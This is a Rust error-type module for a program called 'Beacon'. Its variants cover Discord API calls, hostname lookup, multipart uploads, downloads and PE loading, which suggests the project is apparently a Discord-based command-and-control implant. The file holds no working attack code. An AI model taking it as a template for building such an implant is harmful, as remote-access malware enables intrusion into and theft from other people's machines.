//! Error types for Beacon
//!
//! Centralized error handling using thiserror for clean error propagation.

use thiserror::Error;

/// Main error type for the beacon
#[derive(Error, Debug)]
pub enum BeaconError {
    /// Configuration parsing errors
    #[error("Configuration error: {0}")]
    Config(#[from] toml::de::Error),

    /// HTTP/Network errors from reqwest
    #[error("HTTP request failed: {0}")]
    Http(#[from] reqwest::Error),

    /// Discord API returned an error response
    #[error("Discord API error: HTTP {status} - {message}")]
    Discord { status: u16, message: String },

    /// Failed to get system hostname
    #[error("Failed to get hostname: {0}")]
    Hostname(String),

    /// Rate limited by Discord
    #[error("Rate limited by Discord, retry after {retry_after} seconds")]
    RateLimited { retry_after: u64 },

    /// Multipart form building error
    #[error("Multipart form error: {0}")]
    Multipart(String),

    /// PE Loading error
    #[error("PE Loading error: {0}")]
    PeLoader(String),

    /// Download error
    #[error("Download error: {0}")]
    Download(String),
}

/// Result type alias using BeaconError
pub type Result<T> = std::result::Result<T, BeaconError>;
